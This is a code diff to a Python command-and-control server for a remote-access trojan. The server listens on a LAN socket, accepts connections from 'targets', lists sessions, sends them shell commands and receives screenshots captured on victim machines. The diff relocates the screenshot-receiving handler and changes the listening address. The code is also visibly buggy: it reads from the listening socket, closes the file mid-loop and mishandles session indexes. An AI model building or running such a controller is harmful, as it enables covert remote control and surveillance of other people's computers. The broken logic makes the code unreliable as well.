@@ -14,6 +14,7 @@ import queue
 import sys , os , time
 from tabulate import *
 import tqdm
+from tool import *
 #from tool import help_menu
 '''setting the variabeles'''
 NUMBER_OF_THREAD = 2
@@ -22,7 +23,7 @@ queue = queue.Queue()
 all_connection = []
 address_connection = []
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-host = "192.168.1.110"
+host = "192.168.1.37"
 port = 5050
 SEPARATOR = "<SEPARATOR>"
 ''' setting a socket creating'''
@@ -60,7 +61,7 @@ def conection_accept():
 			conn.setblocking(1)
 			all_connection.append(conn)
 			address_connection.append(address)
-			print(f"\n  {c}[{g}+{c}] {g}Connection have ben accepted {y}IP{r} :{v} {address[0:]} {y}PORT{r} :{v} {str(address[1:])}")
+			print(f"\n  {c}[{g}+{c}] {g}Connection have ben accepted {y}IP{r} :{v} {address_connection[0:]} {y}PORT{r} :{v} {str(address_connection[1:])}")
 			continue
 		except:
 			print(f"\n  {c}[{r}-{c}] {y}Faild to accept the connection")
@@ -71,25 +72,12 @@ def intarface():
 		if op_listen == "clear":
 			os.system("clear")
 		elif op_listen == "exit":
+			s.close()
 			sys.exit()
 		elif op_listen == "show session":
 			session_list()
-		elif op_listen == "connect":
+		elif op_listen[0:] == "connect":
 			session_connect()
-		elif op_listen[0:] == "screenshot":
-			img = s.recv(1024).decode("utf-8")
-			img_name , img_size = img.split(SEPARATOR)
-			img_name = os.path.basename(img_name)
-			img_size = int(img_size)
-			progress = tqdm.tqdm(range(img_size), f"{c}[{g}!{c}] {y}Receiving {img_name}", unit="B", unit_scale=True, unit_divisor=1024)
-			with open(img_name,"wb") as i :
-				while True:
-					bytes_reads = s.recv(1024)
-					if not bytes_reads:
-						break
-					i.write(bytes_reads)
-					i.close()
-					progress.update(len(bytes_reads))
 		elif op_listen == "help":
 			help_menu()
 		else:
@@ -97,22 +85,23 @@ def intarface():
 '''creating a list os every session'''
 def session_list():
 	result = ""
-	for i , conn in enumerate(all_connection):
+	for i , conn in enumerate(address_connection):
 		try:
 			msg = ""
-			conn.send(str(msg).encode("utf-8"))
-			conn.recv(1024)
-		except s.error as error:
+			s.send(str(msg).encode("utf-8"))
+			s.recv(1024)
+		except socket.error as error:
 			del all_connection[i]
-			del address_connection[conn]
-		result = [f"{y}session number",f"{y}IP",f"{y}PORT"],[f"{r}{str(i)}",f"{r}str{address_connection[i][0]}",f"{r}{address_connection[i][1]}"]
-	print(tabulate(result, headers="firstrow",tablefmt="grid"))
+			del address_connection[0]
+		#result = [f"{y}session number",f"{y}IP",f"{y}PORT"],[f"{r}{str(i)}",f"{r}str{address_connection[i][0:]}",f"{r}{address_connection[i][1:]}"]
+	#print(tabulate(result, headers="firstrow",tablefmt="fancy_grid"))
+	#print(str(address_connection[i][0:]))
 '''connecting to the targets'''
 def session_connect(op_listen):
 	try:
 		print(f"  {c}[{g}!{c}] {y}Trying to connecting to {v}>> {r} {str(address_connection[0:])}")
 		time.sleep(1)
-		target = op_listen.replace("connect ","")
+		target = op_listen.replace("connect "," ")
 		target = int(target)
 		conn = all_connection[target]
 		time.sleep(2)
@@ -130,6 +119,21 @@ def send_command():
 				conn.send(str.encode(msg_command))
 				client_response = str(conn.recv(1024), "utf-8")
 				print(client_response, end="")
+			if msg_command[0:] == "screenshot":
+				img = s.recv(1024).decode("utf-8")
+				img_name , img_size = img.split(SEPARATOR)
+				img_name = os.path.basename(img_name)
+				img_size = int(img_size)
+				progress = tqdm.tqdm(range(img_size), f"{c}[{g}!{c}] {y}Receiving {img_name}", unit="B", unit_scale=True, unit_divisor=1024)
+				with open(img_name,"wb") as i :
+					while True:
+						bytes_reads = s.recv(1024)
+						if not bytes_reads:
+							break
+						i.write(bytes_reads)
+						i.close()
+						progress.update(len(bytes_reads))
+
 		except:
 			print(f"  {c}[{r}?{c}] {y}Connection lost to the target")
 			break
